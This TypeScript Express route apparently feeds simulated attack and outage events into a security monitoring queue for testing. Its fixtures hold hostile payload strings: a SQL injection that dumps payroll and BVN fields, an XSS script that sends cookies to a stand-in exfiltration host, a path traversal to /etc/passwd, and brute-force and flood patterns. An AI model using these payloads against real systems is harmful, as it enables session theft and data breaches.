import { Router, Request, Response } from 'express';
import { ingestQueue } from '../ingest/ingest-queue';
import { db } from '../db/database';
import { heartbeatEngine } from '../prober/heartbeat-engine';

export const simulationRouter = Router();

/**
 * Trigger simulated attacks and infrastructure failures for live testing
 */
simulationRouter.post('/attack', async (req: Request, res: Response) => {
  const { scenario, systemId = 'NOUN-HRMS' } = req.body;

  switch (scenario) {
    case 'sqli': {
      ingestQueue.enqueue({
        systemId,
        method: 'POST',
        path: '/api/v1/payroll/export',
        statusCode: 500,
        latencyMs: 145,
        clientIp: '194.26.29.112', // Russian Bulletproof Botnet
        payloadSnippet: `dept_id=1' UNION SELECT staff_id, full_name, bvn, salary FROM staff_payroll WHERE '1'='1' --`,
        userAgent: 'sqlmap/1.7.2#stable',
        errorMessage: 'Syntax error in SQL statement near UNION SELECT',
      });
      break;
    }

    case 'xss': {
      ingestQueue.enqueue({
        systemId,
        method: 'POST',
        path: '/api/v1/auth/session',
        statusCode: 400,
        latencyMs: 25,
        clientIp: '185.220.101.5', // Tor Exit Node
        payloadSnippet: `<script>fetch('https://c2-exfil.tor/loot?c='+document.cookie)</script>`,
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      });
      break;
    }

    case 'traversal': {
      ingestQueue.enqueue({
        systemId,
        method: 'GET',
        path: '/api/v1/documents/download?file=../../../../../../etc/passwd%00.pdf',
        statusCode: 403,
        latencyMs: 18,
        clientIp: '45.154.255.89', // VPN Scanner
        payloadSnippet: '../../../../../../etc/passwd',
        userAgent: 'Nikto/2.1.6',
      });
      break;
    }

    case 'brute_force': {
      // Simulate 18 rapid 401 failures
      for (let i = 0; i < 18; i++) {
        ingestQueue.enqueue({
          systemId,
          method: 'POST',
          path: '/api/v1/auth/login',
          statusCode: 401,
          latencyMs: 32,
          clientIp: '103.145.13.204',
          payloadSnippet: `username=admin${i}&password=Password123!`,
          userAgent: 'Hydra/9.5',
        });
      }
      break;
    }

    case 'ddos': {
      // Simulate 60 rapid requests in 1 second
      for (let i = 0; i < 60; i++) {
        ingestQueue.enqueue({
          systemId,
          method: 'GET',
          path: '/api/v1/payroll/status',
          statusCode: 200,
          latencyMs: 8,
          clientIp: '194.26.29.112',
          userAgent: 'LOIC/1.0',
        });
      }
      break;
    }

    case 'neon_timeout': {
      ingestQueue.enqueue({
        systemId,
        method: 'POST',
        path: '/api/v1/payroll/batch-process',
        statusCode: 504,
        latencyMs: 15200,
        clientIp: '102.89.23.45',
        errorMessage: 'FATAL: remaining connection slots are reserved for non-replication superuser connections (Neon pooler timeout: failed to checkout a connection within 5000ms)',
      });
      break;
    }

    case 'render_oom': {
      ingestQueue.enqueue({
        systemId,
        method: 'GET',
        path: '/api/v1/reports/all-staff-export',
        statusCode: 502,
        latencyMs: 8400,
        clientIp: '197.210.64.12',
        errorMessage: '<--- Last few GCs ---> [1:0x12345678] JavaScript heap out of memory. Error code 137 SIGKILL on Render container',
      });
      break;
    }

    case 'coturn_stall': {
      ingestQueue.enqueue({
        systemId: 'Security-Dispatch',
        method: 'POST',
        path: '/api/v1/dispatch/relay-webrtc',
        statusCode: 503,
        latencyMs: 6500,
        clientIp: '105.112.98.11',
        errorMessage: 'Coturn WebRTC relay stall: UDP port 3478 unreachable or candidate packet dropped',
      });
      break;
    }

    case 'slow_query': {
      ingestQueue.enqueue({
        systemId,
        method: 'GET',
        path: '/api/v1/payroll/search?query=bello',
        statusCode: 200,
        latencyMs: 920,
        clientIp: '197.210.64.12',
        queryLatencyMs: 912.4,
        queryText: 'SELECT p.*, e.bvn, e.nin FROM payroll_records p JOIN employees e ON e.id = p.employee_id WHERE p.tenant_id = $1 AND p.status = $2 ORDER BY p.created_at DESC',
      });
      break;
    }

    case 'probe_failure': {
      const probes = await db.getProbes();
      const targetProbe = probes.find((p) => p.system_id === systemId) || probes[0];
      if (targetProbe) {
        await db.updateProbeMetrics(targetProbe.id, {
          status: 'DOWN',
          ttfbMs: 5800,
          dnsMs: 450,
          tcpMs: 2500,
          sslExpiryDays: 4,
          isSuccess: false,
          errorMessage: 'HTTP 500 Internal Server Error: Database pool exhausted and SSL certificate expiring in 4 days',
        });
      }
      break;
    }

    default:
      res.status(400).json({ error: 'UNKNOWN_SCENARIO', message: `Scenario ${scenario} is not recognized.` });
      return;
  }

  res.json({
    status: 'SIMULATION_TRIGGERED',
    scenario,
    systemId,
    timestamp: new Date().toISOString(),
  });
});
